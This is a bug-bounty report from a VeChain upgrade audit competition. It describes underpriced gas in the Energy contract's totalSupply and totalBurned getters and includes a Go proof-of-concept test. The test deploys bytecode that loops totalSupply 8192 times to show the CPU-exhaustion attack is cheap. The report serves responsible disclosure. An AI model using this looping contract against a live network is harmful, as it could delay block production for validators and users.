# 55925 bc insight underpriced supply queries enable cheap cpu dos

**Submitted on Oct 7th 2025 at 20:42:31 UTC by @spongebob for** [**Attackathon | VeChain Hayabusa Upgrade**](https://immunefi.com/audit-competition/vechain-hayabusa-upgrade-attackathon)

* **Report ID:** #55925
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/vechain/thor/compare/master...release/hayabusa>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

Underpriced gas in `native_totalSupply` lets callers trigger three storage decodes and heavy `CalcEnergy` math while only paying a single `SloadGas` (200). The native wrapper charges once at <https://github.com/vechain/thor/blob/3ad5e1805c778a070e27d0d0293f335a256c235e/builtin/energy\\_native.go#L22-L29>

Yet `TotalSupply()` pulls initial-supply, growth-stop-time, and issued via `State.DecodeStorage` plus re-does big-int growth math:

* <https://github.com/vechain/thor/blob/3ad5e1805c778a070e27d0d0293f335a256c235e/builtin/energy/energy.go#L48-L133>
* <https://github.com/vechain/thor/blob/3ad5e1805c778a070e27d0d0293f335a256c235e/builtin/energy/energy.go#L229-L239>

Example of one of the storage decodes:

```go
func (e *Energy) GetEnergyGrowthStopTime() (uint64, error) {
	if e.stopTime != 0 {
		return e.stopTime, nil
	}

	var time uint64
	if err := e.state.DecodeStorage(e.addr, growthStopTimeKey, func(raw []byte) error {
		if len(raw) == 0 {
			return nil
		}
		return rlp.DecodeBytes(raw, &time)
```

The underlying account storage decode is implemented here:

* <https://github.com/vechain/thor/blob/3ad5e1805c778a070e27d0d0293f335a256c235e/state/account.go#L44-L77>

After the first call the trie data is cached, but every subsequent call still re-decodes the RLP payloads and multiplies big integers.

An attacker can loop `Energy.totalSupply()` thousands of times in one clause, consuming most of a block’s CPU while buying only ≈200 gas per iteration.

`native_totalBurned` has the same pattern. It bills one `SloadGas` in: <https://github.com/vechain/thor/blob/3ad5e1805c778a070e27d0d0293f335a256c235e/builtin/energy\\_native.go#L30-L36>

Yet `TotalBurned()` RLP-decodes the aggregated add/sub counters and performs big-int arithmetic. That extra work is effectively free, giving another cheap tight loop primitive (lower impact than `totalSupply`, but still mis-priced).

Severity rationale: This can let an attacker delay block production by cheaply forcing validators into heavy CPU work.

## Recommendation

{% hint style="info" %}
Charge for each underlying storage fetch (for example, `3 * thor.SloadGas` for `totalSupply`) and add a fixed compute premium to cover the big-int math in both getters.
{% endhint %}

## Proof of Concept

{% code title="poc\_test.go" %}

```go
package builtin_test

import (
	"encoding/hex"
	"math/big"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/vechain/thor/v2/genesis"
	"github.com/vechain/thor/v2/test/testchain"
	"github.com/vechain/thor/v2/thor"
	"github.com/vechain/thor/v2/tx"
)

// TestEnergyTotalSupplyUnderpricedGasPoC demonstrates that looping Energy.totalSupply()
// thousands of times costs only a few hundred gas per iteration, even though each call
// performs multiple storage reads and big integer operations under the hood.
func TestEnergyTotalSupplyUnderpricedGasPoC(t *testing.T) {
	chain, err := testchain.NewDefault()
	require.NoError(t, err)

	deployer := genesis.DevAccounts()[0]

	const creationHex = "6056600c60003960566000f37f592b389c0000000000000000000000000000000000000000000000000000000000000060005260003580156055575b600060006004600073000000000000000000000000456e657267795afa506001900380602c575b5000"

	creationCode, err := hex.DecodeString(creationHex)
	require.NoError(t, err)

	deployClause := tx.NewClause(nil).WithData(creationCode)
	deployTx := new(tx.Builder).
		ChainTag(chain.Repo().ChainTag()).
		Expiration(50).
		Gas(5_000_000).
		Clause(deployClause).
		Build()

	deployTx = tx.MustSign(deployTx, deployer.PrivateKey)
	require.NoError(t, chain.MintTransactions(deployer, deployTx))

	contractAddr := thor.CreateContractAddress(deployTx.ID(), 0, 0)

	zeroInput := make([]byte, 32)
	zeroClause := tx.NewClause(&contractAddr).WithData(zeroInput)
	zeroTx := new(tx.Builder).
		ChainTag(chain.Repo().ChainTag()).
		Expiration(50).
		Gas(5_000_000).
		Clause(zeroClause).
		Build()

	zeroTx = tx.MustSign(zeroTx, deployer.PrivateKey)
	require.NoError(t, chain.MintTransactions(deployer, zeroTx))
	zeroReceipt, err := chain.GetTxReceipt(zeroTx.ID())
	require.NoError(t, err)
	baseGas := zeroReceipt.GasUsed

	iterations := uint64(8192)
	iterInput := make([]byte, 32)
	new(big.Int).SetUint64(iterations).FillBytes(iterInput)

	hammerClause := tx.NewClause(&contractAddr).WithData(iterInput)
	hammerTx := new(tx.Builder).
		ChainTag(chain.Repo().ChainTag()).
		Expiration(50).
		Gas(10_000_000).
		Clause(hammerClause).
		Build()

	hammerTx = tx.MustSign(hammerTx, deployer.PrivateKey)
	require.NoError(t, chain.MintTransactions(deployer, hammerTx))
	hammerReceipt, err := chain.GetTxReceipt(hammerTx.ID())
	require.NoError(t, err)
	gasUsed := hammerReceipt.GasUsed

	require.Greater(t, gasUsed, baseGas)

	totalLoopGas := gasUsed - baseGas
	avgPerCall := float64(totalLoopGas) / float64(iterations)

	require.Less(t, avgPerCall, float64(thor.SloadGas))

	t.Logf("Energy.totalSupply() %d times used %d gas (baseline %d, avg per call %.4f)", iterations, gasUsed, baseGas, avgPerCall)
}
```

{% endcode %}
